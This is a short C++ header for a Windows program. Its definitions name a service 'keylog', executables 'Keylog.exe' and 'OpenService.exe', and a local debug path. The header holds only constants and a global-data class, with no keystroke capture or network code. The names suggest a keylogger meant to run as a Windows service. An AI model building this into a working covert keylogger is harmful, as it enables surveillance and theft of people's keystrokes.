#ifndef __DEFINE_H_
#define __DEFINE_H_

#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <stdio.h>
using namespace std;

#define SERVICE_NAME L"keylog"
#define MAIN_PATH "D:\\Space\\Safe\\KeyWordConsole\\Debug\\KeyWordConsole.exe"
#define MAIN_FILE "Keylog.exe"
#define SERVICE_FILE "OpenService.exe"
class GlobalData
{
public:
	static std::string configPath; 
	static HWND hWindow;
	static HINSTANCE hinstDLL;
};

#endif